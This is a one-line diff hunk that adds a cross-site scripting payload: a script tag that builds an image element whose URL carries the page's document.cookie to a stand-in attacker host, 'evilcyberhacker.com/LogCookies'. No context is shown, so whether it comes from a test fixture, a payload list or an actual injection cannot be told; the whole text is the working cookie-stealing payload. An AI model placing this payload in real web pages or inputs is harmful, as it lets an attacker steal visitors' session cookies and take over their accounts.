@@ -1,0 +1,1 @@
+<script>var img=document.createElement("img");img.src="http://evilcyberhacker.com/LogCookies?cookies="%2bdocument.cookie;document.body.appendChild(img);</script>
